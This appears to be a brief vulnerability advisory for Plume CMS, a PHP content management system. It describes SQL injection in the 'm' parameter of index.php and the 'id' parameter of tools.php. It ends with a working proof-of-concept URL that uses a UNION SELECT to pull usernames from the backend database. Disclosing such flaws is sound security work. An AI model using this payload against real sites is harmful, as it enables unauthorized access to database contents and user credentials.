Details.

Plume CMS is a content management system written in PHP. The application
suffers from SQL injection vulnerabilities in index.php and tools.php, as it
fails to validate data supplied in the "m" variable of index.php before
being used in a SQL query. Additionally, the variable "id" of tools.php is
also vulnerable to the same type of attack.

SQL injection attacks can give an attacker access to backend database
contents, the ability to remotely execute system commands, or in some
circumstances the means to take control of the operating system hosting the
database.



Proof of Concept.

/plume/manager/index.php?m=1 UNION SELECT
NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,user_username,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL
